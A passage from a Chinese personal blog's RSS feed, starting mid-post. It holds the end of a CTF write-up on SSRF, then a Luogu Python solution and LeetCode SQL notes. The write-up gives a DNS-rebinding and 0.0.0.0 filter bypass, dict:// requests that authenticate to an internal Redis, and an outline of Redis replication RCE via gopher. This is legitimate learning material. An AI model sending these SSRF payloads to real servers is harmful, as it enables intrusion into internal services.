&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;好在wp里提供了另一种思路，DNS重绑定漏洞&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/NOSEC2019/article/details/103126829&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/NOSEC2019/article/details/103126829&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（静待15min）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在我们又读了一篇文章，很棒，&lt;a class=&#34;link&#34; href=&#34;https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;工具网站&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;快试试！（？）&lt;/p&gt;
&lt;p&gt;还有个方便的方法，题里忘了过滤了的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0.0.0.0&lt;/code&gt;代表本机&lt;code&gt;ipv4&lt;/code&gt;的所有地址，所以直接&lt;code&gt;http://0.0.0.0/hint.php&lt;/code&gt;也可以……&lt;/p&gt;
&lt;p&gt;不错，所以为啥一开始翻ssrf过滤绕过的时候没找到这个方法^_^&lt;/p&gt;
&lt;p&gt;好在我们现在可以看到hint.php了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  highlight_file(__FILE__);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  file_put_contents(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;?php echo &amp;#39;redispass is root&amp;#39;;exit();&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_POST&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;本来以为是过死亡exit&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/8163&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xz.aliyun.com/t/8163&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;结果不是……&lt;/p&gt;
&lt;p&gt;完全不会，今晚的目标就是成功复现！呜呜呜&lt;/p&gt;
&lt;p&gt;redis？怎么说……我就知道它是种NoSQL型数据库，来了解一下。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/powertoolsteam/p/redis.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cnblogs.com/powertoolsteam/p/redis.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先……我要知道redis在啥端口——6379&lt;/p&gt;
&lt;p&gt;然后题里告诉你密码是root&lt;/p&gt;
&lt;p&gt;使用dict协议去访问redis&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;?url=dict://0.0.0.0:6379
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/624021b127f86abb2a920b6e.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/624021b127f86abb2a920b6e.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;存在密码校验，再加上密码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;?url=dict://0.0.0.0:6379/auth root
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/624021c727f86abb2a92a191.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/624021c727f86abb2a92a191.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/624021d527f86abb2a92fca9.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/624021d527f86abb2a92fca9.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Redis客户端支持管道操作，可以通过单个写入操作发送多个命令，而无需在发出下一个命令之前读取上一个命令的服务器回复。所有的回复都可以在最后阅读。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dict&lt;/code&gt;协议一次只能执行一条命令，因该是仅仅能进行密码验证。此处需要&lt;code&gt;gopher&lt;/code&gt;协议，可以一次性完成密码验证以及恶意命令执行。&lt;/p&gt;
&lt;p&gt;攻击方式位Redis基于主从复制RCE&lt;/p&gt;
&lt;p&gt;提前了解主从复制是啥&lt;/p&gt;
&lt;p&gt;主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。&lt;/p&gt;
&lt;p&gt;接下来，利用这一点，我们创建&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;&#34; &gt;https://github.com/xmsec/redis-ssrf&lt;/a&gt;
&lt;a class=&#34;link&#34; href=&#34;&#34; &gt;https://github.com/n0b0dyCN/redis-rogue-server&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;代码审计-&amp;gt;看到curl_exec想到ssrf-&amp;gt;打内网-&amp;gt;根据提示redisgetshell-&amp;gt;生成rogueserver（vps或buu中的linux靶机）-&amp;gt;利用gopher协议生成payload或者直接反弹shell&lt;/p&gt;
&lt;p&gt;参考&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.secpulse.com/archives/132215.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.secpulse.com/archives/132215.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;学到了，&lt;a class=&#34;link&#34; href=&#34;https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这篇博客&lt;/a&gt;里绕过一开始限制的地方写的很全，建议去看看。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>P5461赦免战俘</title>
        <link>https://proben1.github.io/2021/p5461%E8%B5%A6%E5%85%8D%E6%88%98%E4%BF%98/</link>
        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/p5461%E8%B5%A6%E5%85%8D%E6%88%98%E4%BF%98/</guid>
        <description>&lt;h1 id=&#34;p5461-赦免战俘&#34;&gt;P5461 赦免战俘&lt;/h1&gt;
&lt;p&gt;心态小裂，写了n遍，最后发现循环里忘加x，y了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;input&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a)] &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;l &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;func&lt;/span&gt;(l,x,y):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; l &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt; :
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(x,x&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;)) :
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(y,y&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;)) :
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            b[i][j] &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    func(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),x&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),y)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    func(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),x,y&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    func(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),x&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;),y&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(l&lt;span style=&#34;color:#ff79c6&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;func(l,&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;a):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(b[i][j],end&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>刷题1</title>
        <link>https://proben1.github.io/2021/%E5%88%B7%E9%A2%981/</link>
        <pubDate>Mon, 22 Nov 2021 16:35:10 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/%E5%88%B7%E9%A2%981/</guid>
        <description>&lt;h4 id=&#34;182-查找重复的电子邮箱httpsleetcode-cncomproblemsduplicate-emails&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://leetcode-cn.com/problems/duplicate-emails/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;182. 查找重复的电子邮箱&lt;/a&gt;&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;`&lt;/span&gt;Email&lt;span style=&#34;color:#ff79c6&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;`&lt;/span&gt;Email&lt;span style=&#34;color:#ff79c6&#34;&gt;`&lt;/span&gt;, &lt;span style=&#34;color:#ff79c6&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#ff79c6&#34;&gt;`&lt;/span&gt;Email&lt;span style=&#34;color:#ff79c6&#34;&gt;`&lt;/span&gt;) &lt;span style=&#34;color:#ff79c6&#34;&gt;as&lt;/span&gt; a
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;`&lt;/span&gt;Person&lt;span style=&#34;color:#ff79c6&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;group&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;`&lt;/span&gt;Email&lt;span style=&#34;color:#ff79c6&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;) &lt;span style=&#34;color:#ff79c6&#34;&gt;as&lt;/span&gt; temp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;where&lt;/span&gt; a &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一些不熟悉的语句&lt;/p&gt;
&lt;p&gt;like 模糊查询&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; employees &lt;span style=&#34;color:#ff79c6&#34;&gt;where&lt;/span&gt; last_name &lt;span style=&#34;color:#ff79c6&#34;&gt;like&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%a%&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;group by（常常和聚合函数一起使用）
聚合函数：&lt;strong&gt;count() , sum() , avg() , max() , min()&lt;/strong&gt;
根据by对数据按照哪个字段进行分组，或者是哪几个字段进行分组。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt;  字段   &lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt;  表名  &lt;span style=&#34;color:#ff79c6&#34;&gt;where&lt;/span&gt;   条件   &lt;span style=&#34;color:#ff79c6&#34;&gt;group&lt;/span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;by&lt;/span&gt;    字段;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;#&lt;/span&gt; 单字段
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt;  grade  &lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt;  student   &lt;span style=&#34;color:#ff79c6&#34;&gt;group&lt;/span&gt;   &lt;span style=&#34;color:#ff79c6&#34;&gt;by&lt;/span&gt;   grade;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;#&lt;/span&gt; 多字段
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt;  name , &lt;span style=&#34;color:#ff79c6&#34;&gt;sum&lt;/span&gt;(salary)    &lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt;   student    &lt;span style=&#34;color:#ff79c6&#34;&gt;group&lt;/span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;by&lt;/span&gt;   name , grade;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name和grade看成一个整体，name和grade相同的才可以分成一组，一个不一样就不能分成一组。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;having 对group by分组和聚合之后的数据进行过滤
（与where正好相反）&lt;/p&gt;
